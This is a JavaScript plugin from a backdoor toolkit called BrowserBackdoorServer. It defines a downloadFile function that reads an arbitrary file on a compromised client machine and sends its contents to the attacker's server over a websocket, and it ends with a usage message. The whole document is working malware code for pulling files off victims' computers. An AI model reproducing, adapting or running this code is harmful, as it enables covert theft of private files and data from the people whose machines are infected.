// INTERACTIVE
/*
 * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Downloads a file from the client
 * Parameters: fullPath, encoding
 * Returns: undefined, error, file
 * Author: IMcPwn
 */

fs = require('fs');

downloadFile = function (fullPath, encoding) {
    fs.readFile(fullPath, encoding, function (err, data) {
        if (err) ws.send(err);
        ws.send(data);
    });
}

return "\nUsage: downloadFile(fullPath, encoding)\n- fullPath is the properly escaped full path of the file.\n- encoding is a string of the encoding type of the file. E.g. \"utf8\".";
